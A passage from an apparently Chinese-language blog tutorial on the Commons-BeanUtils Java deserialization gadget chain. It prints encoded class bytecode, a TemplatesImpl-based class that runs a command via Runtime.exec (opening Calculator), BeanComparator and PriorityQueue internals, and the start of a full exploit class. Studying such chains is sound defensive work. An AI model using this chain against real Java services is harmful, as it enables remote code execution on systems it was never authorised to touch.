class="number">65</span> ,<span class="number">112</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">99</span> ,<span class="number">97</span> ,<span class="number">116</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">111</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">47</span> ,<span class="number">67</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">99</span> ,<span class="number">117</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">111</span> ,<span class="number">114</span> ,</span><br><span class="line">            <span class="number">46</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">112</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">39</span> ,<span class="number">0</span> ,<span class="number">40</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">41</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">42</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">43</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">72</span> ,<span class="number">101</span> ,<span class="number">108</span> ,<span class="number">108</span> ,<span class="number">111</span> ,<span class="number">32</span> ,<span class="number">84</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">112</span> ,</span><br><span class="line">            <span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">115</span> ,<span class="number">73</span> ,<span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">44</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">45</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">46</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">28</span> ,<span class="number">121</span> ,<span class="number">115</span> ,<span class="number">111</span> ,<span class="number">115</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">72</span> ,<span class="number">101</span> ,<span class="number">108</span> ,<span class="number">108</span> ,<span class="number">111</span> ,<span class="number">84</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">115</span> ,<span class="number">73</span> ,</span><br><span class="line">            <span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">64</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">114</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">65</span> ,<span class="number">98</span> ,<span class="number">115</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">99</span> ,<span class="number">116</span> ,<span class="number">84</span> ,<span class="number">114</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">116</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">57</span> ,<span class="number">99</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,</span><br><span class="line">            <span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">108</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,<span class="number">47</span> ,<span class="number">84</span> ,<span class="number">114</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">69</span> ,<span class="number">120</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">112</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">111</span> ,<span class="number">110</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">106</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">69</span> ,<span class="number">120</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">112</span> ,<span class="number">116</span> ,<span class="number">105</span> ,</span><br><span class="line">            <span class="number">111</span> ,<span class="number">110</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">17</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">82</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">103</span> ,<span class="number">101</span> ,<span class="number">116</span> ,<span class="number">82</span> ,<span class="number">117</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">40</span> ,<span class="number">41</span> ,<span class="number">76</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">82</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">59</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">4</span> ,<span class="number">101</span> ,<span class="number">120</span> ,<span class="number">101</span> ,<span class="number">99</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">39</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">59</span> ,<span class="number">41</span> ,<span class="number">76</span> ,</span><br><span class="line">            <span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">80</span> ,<span class="number">114</span> ,<span class="number">111</span> ,<span class="number">99</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">115</span> ,<span class="number">115</span> ,<span class="number">59</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">16</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">83</span> ,<span class="number">121</span> ,<span class="number">115</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">3</span> ,<span class="number">111</span> ,<span class="number">117</span> ,<span class="number">116</span> ,<span class="number">1</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">21</span> ,<span class="number">76</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">111</span> ,<span class="number">47</span> ,<span class="number">80</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,</span><br><span class="line">            <span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">101</span> ,<span class="number">97</span> ,<span class="number">109</span> ,<span class="number">59</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">111</span> ,<span class="number">47</span> ,<span class="number">80</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">101</span> ,<span class="number">97</span> ,<span class="number">109</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">7</span> ,<span class="number">112</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">108</span> ,<span class="number">110</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">106</span> ,</span><br><span class="line">            <span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">103</span> ,</span><br><span class="line">            <span class="number">59</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">0</span> ,<span class="number">33</span> ,<span class="number">0</span> ,<span class="number">8</span> ,<span class="number">0</span> ,<span class="number">9</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">3</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">11</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">25</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">3</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,-<span class="number">79</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">6</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">14</span> ,<span class="number">0</span> ,<span class="number">14</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">15</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">16</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">12</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">25</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,-<span class="number">79</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">1</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">6</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">16</span> ,<span class="number">0</span> ,<span class="number">14</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">15</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">17</span> ,<span class="number">0</span> ,<span class="number">18</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">2</span> ,<span class="number">0</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">58</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">22</span> ,</span><br><span class="line">            <span class="number">42</span> ,-<span class="number">73</span> ,<span class="number">0</span> ,<span class="number">1</span> ,-<span class="number">72</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">18</span> ,<span class="number">3</span> ,-<span class="number">74</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">76</span> ,-<span class="number">78</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">5</span> ,<span class="number">18</span> ,<span class="number">6</span> ,-<span class="number">74</span> ,<span class="number">0</span> ,<span class="number">7</span> ,-<span class="number">79</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">18</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">18</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">20</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">0</span> ,<span class="number">14</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">20</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">21</span> ,&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;testClassBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中HelloTemplatesImpl代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span></span><br><span class="line"><span class="title class_">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span></span><br><span class="line"><span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span><br><span class="line"><span class="params">SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesImpl&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>其getOutputProperties调用了newTransformer，进而导致字节码被执行。(入口2)</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">defineClass:<span class="number">185</span>, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:<span class="number">414</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:<span class="number">451</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">main:<span class="number">101</span>, Test_commons_beanutils (ysoserial)</span><br></pre></td></tr></table></figure>

<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">obj.getOutputProperties();<span class="comment">//下断点</span></span><br></pre></td></tr></table></figure>

<p>又因为getOutputProperties符合javabeen的小驼峰式命名法规则，并且返回类型不是void，所以我们可以通过PropertyUtils.getProperty进行调用。代码如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(obj,<span class="string">&quot;OutputProperties&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h3><p>BeanComparator位于org.apache.commons.beanutils包内，其compare会调用PropertyUtils.getProperty，这就和上面的命令执行连接起来了，我们做个简单测试。<br><strong>其构造函数</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">(String property, Comparator&lt;?&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setProperty(property);</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>其compare方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(T o1, T o2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.property == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(o1, o2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty(o2, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(value1, value2);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;IllegalAccessException: &quot;</span> + var5.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;InvocationTargetException: &quot;</span> + var6.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们学习了CC4的基础知识，假设compare(T o1, T o2)两个参数是PriorityQueue传过来的，那么在PriorityQueue中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">queue[i] = s.readObject();<span class="comment">//PriorityQueue.readObject</span></span><br><span class="line">heapify();<span class="comment">//调用点,PriorityQueue.readObject</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//siftDownUsingComparator又调用了，集合的compare方法。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)<span class="comment">//双参数传入compare</span></span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>我们先看利用代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/27 14:20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_commons_beanutils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">54</span> ,-<span class="number">2</span> ,-<span class="number">70</span> ,-<span class="number">66</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">52</span> ,<span class="number">0</span> ,<span class="number">47</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">9</span> ,<span class="number">0</span> ,<span class="number">22</span> ,</span><br><span class="line">            <span class="number">10</span> ,<span class="number">0</span> ,<span class="number">23</span> ,<span class="number">0</span> ,<span class="number">24</span> ,<span class="number">8</span> ,<span class="number">0</span> ,<span class="number">25</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">23</span> ,<span class="number">0</span> ,<span class="number">26</span> ,<span class="number">9</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">27</span> ,<span class="number">0</span> ,<span class="number">28</span> ,<span class="number">8</span> ,<span class="number">0</span> ,<span class="number">29</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">30</span> ,<span class="number">0</span> ,<span class="number">31</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">32</span> ,<span class="number">7</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">33</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">9</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">102</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">109</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">114</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">105</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,<span class="number">47</span> 